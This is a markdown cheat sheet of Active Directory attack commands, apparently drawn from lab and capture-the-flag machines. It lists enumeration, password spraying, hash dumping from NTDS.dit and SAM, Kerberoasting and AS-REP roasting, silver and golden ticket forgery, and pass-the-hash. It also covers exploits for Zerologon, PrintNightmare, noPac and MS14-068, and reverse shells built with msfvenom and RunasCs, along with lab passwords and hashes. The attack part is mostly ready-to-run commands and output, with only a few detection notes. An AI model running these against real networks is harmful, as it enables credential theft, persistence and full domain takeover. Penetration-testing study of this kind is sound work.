### Enterprise Admins
>Members of Domain Admins3 are among the most privileged objects in the domain. If an attacker compromises a member of this group (often referred to as domain administrators), they essentially gain complete control over the domain.

>This attack vector could extend beyond a single domain since an AD instance can host more than one domain in a domain tree or multiple domain trees in a domain forest. While there is a Domain Admins group for each domain in the forest, members of the Enterprise Admins group are granted full control over all the domains in the forest and have Administrator privilege on all DCs. This is obviously a high-value target for an attacker.
### Auto Enumeration 
acquire credentials or other sensitive data in an Active Directory environment
```
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```
### Enumeration
WMI Cheat Sheet
```
wmic qfe get Caption,Description,HotFixID,InstalledOn	//Prints the patch level and description of the Hotfixes applied
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List	//Displays basic host information to include any attributes within the list
wmic process list /format:list	//A listing of all processes on host
wmic ntdomain list /format:list	//Displays information about the Domain and Domain Controllers
wmic useraccount list /format:list	//Displays information about all local accounts and any domain accounts that have logged into the device
wmic group list /format:list	//Information about all local groups
wmic sysaccount list /format:list	//Dumps information about any system accounts that are being used as service accounts.
```
Active Directory User Enumeration
```
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt <IP>
```
>kerbrute = nxc ldap ip -u '' -p '' -k  

>This method doesn't generate Windows event ID 4625: An account failed to log on, but does generate event ID 4768: A Kerberos authentication ticket (TGT) was requested  
```
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
```
rpcclient -U "" -N 172.16.5.5
enumdomusers
```
```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
ldapsearch -x -H ldap://192.168.151.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```
### AD Nested Group Memberships
```
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
-PU, --privileged-users
                        Enumerate All privileged AD Users. Performs recursive
                        lookups for nested members.
```
```
Powerview.ps1
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```
### Domain PasswordSpray
Linux
```
./kerbrute_linux_amd64 passwordspray --dc 10.10.11.60 -d frizz.htb userlist "Welcome1!" -v
```
windows
```
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
LDAP password spraying attempt = many instances of event ID 4771: Kerberos pre-authentication failed  
SMB password spraying attempt = many instances of event ID 4625: An account failed to log on over a short period
### Domain Password Brute-force
```
./kerbrute bruteuser --dc 10.10.11.60 -d frizz.htb pass_file M.SchoolBus -v
```

### Enumerate Domain Shares
```
powershell -ep bypass
Import-module .\PowerView.ps1
Find-DomainShare
ls \\dc1.corp.com\"Important Files"\
type \\dc1.corp.com\"Important Files"\proof.txt
```
### BloodHound
Initiation
```
Compromised machine: Import-Module .\SharpHound.ps1
Compromised machine: Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\

sudo neo4j stop
sudo neo4j start
kali: bloodhound
kali: username:neo4j, pass:zxdxxxxxxxxx
kali: drag zip file into bloodhound

or sharphound.exe -c All --outputdirectory C:\Users\f.frizzle\
```
Compatible Combination:
```
neo4j 4.4.26
bloodhound 4.3.1
SharpHound.ps1 1.1.1
```
### Bloodhound-python
This will extract all json files if you have credential but no shell
```
bloodhound-python -ns 192.168.219.21 -d nagoya-industries.com -u 'Fiona.Clark' -p 'Summer2023' -c all
sudo proxychains4 -f /etc/proxychains4.conf bloodhound-python -ns 10.10.179.140 -d oscp.exam -u 'web_svc' -p 'Diamond1' -c all --dns-tcp
```

### Abusing Exchange Related Group Membership
### Abusing PrivExchange
### Abusing Printer Bug
```
nxc smb ip -u username -p pwd -M printerbug -o LISTENER=ip
nc -nlvp 445
```
### Abusing MS14-068 to domain admin
```
https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek
https://github.com/mubix/pykek
ms14-068.py -u <userName>@<domainName> -s <userSid> -d mantis.htb.local --rc4 ntlm_hash

It will generate ccache file
export KRB5CCNAME=/path/to/ccache
impacket-psexec -k -no-pass htb.local/james@mantis.htb.local(dc-hostname) -dc-ip dc-ip
```
equivalent to 
```
impacket-goldenPac htb.local/james:'J@m3s_P@ssW0rd!'@mantis.htb.local
```
### Enumerating DNS Records
```
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```
### Abusing Password in Description Field
```powershell
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```
### Abusing PASSWD_NOTREQD Field
```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```
### Abusing Group Policy Preferences (GPP) Passwords
>When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:
* Map drives (drives.xml)
* Create local users
* Create printer config files (printers.xml)
* Creating and updating services (services.xml)
* Creating scheduled tasks (scheduledtasks.xml)
* Changing local admin passwords.
>they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share

Groups.xml  
<img width="2802" height="414" alt="image" src="https://github.com/user-attachments/assets/fc4e7943-9881-494c-a29c-61e4f3ddbf64" />
If you retrieve the cpassword value more manually, the gpp-decrypt utility can be used to decrypt the password as follows:
```
gpp-decrypt "value of Cpassword attribute"
```
```powershell
nxc smb ip -u username -p pwd -M gpp_autologin
nxc smb ip -u username -p pwd -M gpp_password
```

### Abusing GPO (Group Policy Object)
Automatic GPO Abuse Check
```
.\ADRecon.ps1
```
Check:
```
Import-Module .\PowerView.ps1
Get-NetGPO
Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9(gpcfilesyspath) -TargetType User -TargetName anirudh
```
Abuse:
```
./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy" (add anirudh to local admin group)
gpupdate /force
```
Enumerating Domain Users' GPO Rights
```
Powerview.ps1
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```
### Abusing "Group Policy Creator Owners" Group
Members of this group can create and modify Group Policy Objects in the domain
```
New-GPO -Name {{GPO-Name}} | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName "{GPO-Name}" --force
gpupdate /force
rlwrap nc -nlvp 464
.\RunasCs.exe 'M.schoolbus' '!suBcig@MehTed!R' cmd.exe -r 10.10.14.4:464
```

### Dump the local password hash and domain cached hash
```
Extract hashes from windows.old's sam and system file:

impacket-secretsdump -sam SAM(local SAM file) -system SYSTEM(local SYSTEM file) local
```
### Dump the NTDS.dit Database
```
impacket-secretdump -ntds NTDS.dit(C:\windows\ntds\) -system SYSTEM local0
```

### Abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket(TGT) and gain rce
https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
```
sekurlsa::logonpasswords
sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
net use \\dc01(logon server)
klist
.\PsExec.exe \\dc01 or \\DC01/Allison cmd.exe
```
### AS-REP Roasting(Require Do not require Kerberos preauthentication enabled)
```
ASREPRoast with username list without pass:
impacket-GetNPUsers nara-security.com/ -dc-ip 192.168.209.30 -usersfile users.txt -format hashcat -outputfile hashes.txt

ASREPRoast with credential:
impacket-GetNPUsers nagoya-industries.com/Fiona.clark:Summer2023 -dc-ip 192.168.183.21  -request -outputfile hashes.asreproast 

hashcat -m 18200 -a 0 passwords_kerb.txt hashes.asreproast
```
```
Windows way:

.\Rubeus.exe asreproast /nowrap
hashcat -a 0 -m 18200 hashes.asreproast2 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
### Kerberoasting
>The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets are encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline. You can know that a user account is being used as a service because the property "ServicePrincipalName" is not null.

>Therefore, to perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required.

>You need valid credentials inside the domain.
```
Check all SPNs within the domain:
setspn -Q */*
```
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
hashcat -a 0 -m 13100 hashes.kerberoast rockyou.txt
```
>Linux Way of Kerberoasting
```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 domain/username:pass -outputfile <output_TGSs_file>
```
>Clock skew too great Error
```
sudo timedatectl set-ntp off
sudo rdate -n 10.10.10.100
Open a new terminal

sudo ntpdate -s domain
```
### Silver Tickets(Require SPN's hash, Domain's SID, SPN)
>Service hash required 

>Since silver and golden tickets represent powerful attack techniques, Microsoft created a security patch to update the PAC structure.5 With this patch in place, the extended PAC structure field PAC_REQUESTOR needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist. The updates from this patch are enforced from October 11, 2022.
```
whoami /user
kerberos::purge
kerberos::golden /user:jeffadmin(impersonated user) /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668(domain SID part from whoami /user) /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327(password hash of iis_service) /ptt
kerberos::list
```
```
Get Domain's sid:
Get-LocalUser -Name 'svc_mssql' | select name,sid(result without the last 3digits)

String Convert to NTLM hash:
https://codebeautify.org/ntlm-hash-generator

Get SPN:
Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
or
Import-Module .\PowerView.ps1
setspn -L svc_mssql

Exploiting silver ticket:
impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn doesnotmatter/dc.sequel.htb -user-id 500 Administrator
# To generate the TGS with AES key
impacket-ticketer -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn> -user-id 500 Administrator

export KRB5CCNAME=/home/kali/Desktop/Administrator.ccache

Klist to view kerberos tickets

/etc/hosts:
192.168.227.21  sequel.htb dc.sequel.htb

#Always remember to sync the kdc time
impacket-mssqlclient -k dc.sequel.htb
```
### Pass The Hash/Pass The Key
>In this attack, an attacker intercepts and steals a valid ticket-granting ticket (TGT) or service ticket (TGS) from a compromised user or service account.

>The attacker then "passes" this stolen ticket to authenticate themselves as the compromised user or service without needing to know the account's password.
```
sekurlsa::tickets /export (export all kirbi files)
kerberos::ptt [0;3e7]-0-0-40a00000-ted@krbtgt-web01.exam.com-exam.com.kirbi (load into memory)
```
```
# Request the TGT with hash
python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
# Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
# Request the TGT with password
impacket-getTGT -dc-ip 10.10.11.60 frizz.htb/M.SchoolBus:'!suBcig@MehTed!R'
# If not provided, password is asked

# Set the TGT for impacket use
export KRB5CCNAME=<TGT_ccache_file>

edit /etc/krb5.conf

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass

# To convert tickets between Linux/Windows format with ticket_converter.py:
impacket-ticket_converter ticket.kirbi ticket.ccache
impacket-ticket_converter ticket.ccache ticket.kirbi
```
### Domain Privilege Escalation via azure ad sync
```
Windows: sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"

evil-winrm -i 10.10.10.172 -u mhope -p "4n0therD4y@n0th3r$" -s .
adconnect.ps1
Get-ADConnectPassword
```
### Domain Priviledge Escalation By Zerologon CVE-2020-1472
```
Detect:
nxc smb ip -u username -p pass -M zerologon

Exploit:
python3 cve-2020-1472-exploit.py Monteverde(dc-name) 10.10.10.172(dc-ip)
impacket-secretsdump 'megabank.local'/'Monteverde$'@10.10.10.172 -just-dc -no-pass 
```
### Windows Print Spooler Service Priviledge Escalation By Printnightmare CVE-2021-1675 CVE-2021-34527
```
Detect:
nxc smb ip -u username -p pass -M printnightmare
```
```
impacket-smbserver test . -smb2support
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
python3 printnightmare.py -dll '\\10.21.176.25\test\backupscript.dll' 'svc-admin:management2005@10.10.211.60'
```
### Windows SMBv3 Privilege Escalation By SMBGhost CVE-2020-0796
>A remote code execution vulnerability exists in the way that the Microsoft Server Message Block 3.1.1 (SMBv3) protocol handles certain requests, aka 'Windows SMBv3 Client/Server Remote Code Execution Vulnerability'.
```
Detect:
nxc smb ip -u user -p pwd -M smbghost
```
```
Exploit:
run the executable file
```
### Domain Priviledge Escalation By NoPac CVE-2021-42278 & CVE-2021-42287
```
Detect:
nxc smb ip -u username -p pass -M nopac

Get Shell:
git clone https://github.com/Ridter/noPac.git
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

or
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap (it will generate ccache file)
export KRB5CCNAME=/path/to/administrator@MANTIS.HTB.LOCAL.ccache
append ip mantis.htb.local to /etc/host
impacket-psexec -k -no-pass htb.local/administrator@mantis.htb.local(dc-hostname) -dc-ip dc-ip

dump hash:
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -dump
```
### Domain Privilege Escalation By Petitpotam CVE-2021-36942
>The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the Local Security Authority Remote Protocol (LSARPC) by abusing Microsoft’s Encrypting File System Remote Protocol (MS-EFSRPC).

>This technique allows an unauthenticated attacker to take over a Windows domain where Active Directory Certificate Services (AD CS) is in use
```
Detect:
nxc smb ip -u username -p pass -M petitpotam
```
### Shadow Credential Attack
```
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 05521294-1c22-cd5e-9836-5d22c2074ba7
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: g17jPEmM.pfx
[*] Must be used with password: TBwxEdb3kfdFrnTrYLb7
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

python gettgtpkinit.py -cert-pfx t0cZeyin.pfx -pfx-pass Ryk4iT9K3g7uEgqSfFG1 certified.htb/management_svc management_svc.ccache
2025-02-05 10:13:39,724 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-02-05 10:13:39,732 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT


2025-02-05 10:14:36,995 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-02-05 10:14:36,996 minikerberos INFO     1dde55cc8c3ee35511712e96382fd98c8b8c096506601a57901a9e3949763db6
INFO:minikerberos:1dde55cc8c3ee35511712e96382fd98c8b8c096506601a57901a9e3949763db6
2025-02-05 10:14:36,997 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file

export KRB5CCNAME=management_svc.ccache
└─$ python3 ./PKINITtools/getnthash.py -key 1dde55cc8c3ee35511712e96382fd98c8b8c096506601a57901a9e3949763db6 certified.htb/management_svc
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```

### Persistence
#### Golden Tickets(only if we can get password hash of a domain user account called krbtgt)
>The golden ticket will require us to have access to a Domain Admin's group account or to have compromised the domain controller itself to work as a persistence method
```
privilege::debug
lsadump::lsa /patch(get password hash)
kerberos::purge
kerberos::golden /user:any_exist_domain_user /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668(domain SID part,from lsadump::lsa /patch) /krbtgt:75b60230a2394a812000dbfad8415965(from lsadump::lsa /patch) /ptt
misc::cmd(launch a new command prompt)
psexec.exe \\dc01 cmd.exe

# To generate the TGT with NTLM
python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
# To generate the TGT with AES key
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
# Set the ticket for impacket use
export KRB5CCNAME=<TGS_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

### Tips
>Always remeber to sync the kdc timestamp before conducting any AD actions such as reset password of another user
```
sudo timedatectl set-ntp off
sudo rdate -n 10.10.10.100
Open a new terminal

sudo ntpdate -s doamin
```
>Fix "module 'OpenSSL.crypto' has no attribute 'PKCS12'" error
```
wget http://launchpadlibrarian.net/732112002/python3-cryptography_41.0.7-4ubuntu0.1_amd64.deb
sudo dpkg -i python3-cryptography_41.0.7-4ubuntu0.1_amd64.deb 

wget http://launchpadlibrarian.net/715850281/python3-openssl_24.0.0-1_all.deb
sudo dpkg -i python3-openssl_24.0.0-1_all.deb
```
